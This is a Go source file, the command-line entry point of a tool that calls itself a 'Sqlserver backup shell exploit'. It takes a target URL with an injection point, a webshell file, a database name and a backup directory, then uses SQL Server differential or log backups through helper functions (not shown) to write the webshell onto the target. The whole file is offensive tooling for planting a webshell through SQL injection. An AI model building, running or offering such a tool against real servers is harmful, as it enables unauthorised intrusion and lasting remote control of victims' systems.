package main

import (
	"SqlServerBackupShell/utils"
	"fmt"
	"github.com/akamensky/argparse"
	"os"
)

func main() {
	parser := argparse.NewParser("backupshell", "Sqlserver backup shell exploit.")
	baseUrl := parser.String("u", "baseUrl", &argparse.Options{Required: true, Help: "The base URL of the target.Use {*} as the payload inject point."})
	method := parser.Selector("m", "method", []string{"GET", "POST"}, &argparse.Options{Required: true, Help: "The method to use."})
	proxyUrl := parser.String("p", "proxyUrl", &argparse.Options{Required: false, Help: "The proxy URL."})
	webshell := parser.String("s", "shell", &argparse.Options{Required: true, Help: "The path to a webshell."})
	headers := parser.StringList("H", "headers", &argparse.Options{Required: false, Help: "The headers to send http request."})
	dbname := parser.String("d", "dbname", &argparse.Options{Required: true, Help: "The database name."})
	backDir := parser.String("b", "backdir", &argparse.Options{Required: true, Help: "The backup directory."})
	postData := parser.String("D", "postData", &argparse.Options{Required: false, Help: "The post data.Use {*} as the payload inject point."})
	timeout := parser.Int("t", "timeout", &argparse.Options{Required: false, Help: "The timeout of http request."})
	mode := parser.Selector("M", "mode", []string{"diff", "log"}, &argparse.Options{Required: false, Help: "The mode to use."})
	combine := parser.Int("c", "combine", &argparse.Options{Required: false, Help: "Combine the payload to one request."})
	err := parser.Parse(os.Args)
	if err != nil {
		fmt.Print(parser.Usage(err))
		os.Exit(1)
	}
	webshellContent := utils.GetFileContent(*webshell)
	var ifCombine bool
	if *combine > 0 {
		ifCombine = true
	} else {
		ifCombine = false
	}
	switch *mode {
	case "diff":
		bl := utils.DiffBackup{}
		bl.Init(*baseUrl, *method, *proxyUrl, *headers, webshellContent, *postData, *timeout, ifCombine)
		bl.Getshell(*dbname, *backDir)
		break
	case "log":
		bl := utils.BackupLog{}
		bl.Init(*baseUrl, *method, *proxyUrl, *headers, webshellContent, *postData, *timeout, ifCombine)
		bl.Getshell(*dbname, *backDir)
		break
	}

	println("done")
}
